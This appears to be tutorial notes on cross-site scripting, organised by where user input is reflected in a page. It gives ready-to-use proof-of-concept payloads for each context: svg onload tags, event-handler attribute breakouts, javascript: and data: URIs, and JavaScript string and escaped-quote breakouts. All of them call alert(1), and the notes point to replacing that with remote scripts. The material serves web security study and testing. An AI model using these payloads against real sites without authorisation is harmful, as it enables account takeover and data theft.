# Section 1: Basics — HTML & JavaScript Context Injections

## Core Idea
XSS payload selection is driven by *where the input lands*. Identify the reflection context (HTML tag, block tag, attribute, script string) first, then pick the matching vector — never spray payloads blindly.

## Frameworks Introduced
- **Context-first taxonomy**: map injection point → context class → payload family
  - When to use: every reflected/stored input probe
  - How: view source, find reflection, classify per the table below, adapt quotes (single↔double) to the scenario

## Key Concepts
- **Simple tag injection**: input lands inside an attribute value or outside tags (not block tags)
- **Block tag injection**: input lands inside `<title><style><script><textarea><noscript><pre><xmp><iframe>` — must close the tag first
- **Inline injection**: input lands inside an attribute value but `>` is filtered/missing — use event handlers, no tag break-out
- **Source injection**: input lands in `href`/`src`/`data`/`action`/`formaction` — `javascript:` or `data:` schemes
- **JS code injection**: input lands inside a script-block string literal
- **Logical-block injection**: string literal *inside* a function/conditional — break out of the block too

## Mental Models
- Use `</tag>` breakout only when reflection sits inside a *block* tag (title/style/script/textarea/noscript/pre/xmp/iframe).
- Think of attribute injection as handler smuggling: `"onmouseover=alert(1)//` turns the existing tag into the vector — no `<>` needed.
- In JS context, escape chain matters: plain `'` → `\'` (backslash-escaped) → `%0A` newline tricks escalate in that order.

## Code Examples

HTML context — simple tag:
```html
<svg onload=alert(1)>
"><svg onload=alert(1)>
```

HTML context — in block tag (use matching `</tag>`):
```html
</tag><svg onload=alert(1)>
"></tag><svg onload=alert(1)>
```

HTML context — inline (no `>` allowed):
```html
"onmouseover=alert(1)//
"autofocus/onfocus=alert(1)//
```

HTML context — source attribute (href/src/data/action):
```html
javascript:alert(1)
data:text/html,<svg onload=alert(1)>
```

JS context — string breakout:
```js
'-alert(1)-'
'-alert(1)//
```

JS context — escaped-quote bypass:
```js
\'-alert(1)//
```

JS context — inside a logical block (3rd for escaped quote):
```js
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
```

JS context — arbitrary reflection in script block:
```html
</script><svg onload=alert(1)>
```

## Anti-patterns
- **Using tag vectors in attribute context**: `<svg>` inside a quoted attribute value does nothing — break out or go inline.
- **Forgetting `//` trailer**: inline/event-handler injections need comment-out to swallow trailing markup.
- **Assuming quote style**: adapt `'`↔`"` to whatever delimiter the target uses.

## Key Takeaways
1. Find the reflection, classify the context, *then* choose the vector.
2. `<svg onload=alert(1)>` is the default tag-based vector — short, handler-driven, no script tag.
3. When `>` is impossible, event-handler attribute injection (`"onmouseover=`, `"autofocus/onfocus=`) is the primary path.
4. In JS strings, `-alert(1)-` keeps arithmetic context valid without needing semicolons.
5. `javascript:` and `data:text/html,` schemes turn `href`/`src`-type sinks into execution.

## Connects To
- **ch03-filter-bypass**: when any character above is stripped, escalate to bypass techniques
- **ch04-exploitation**: replace `alert(1)` with remote script calls for real impact
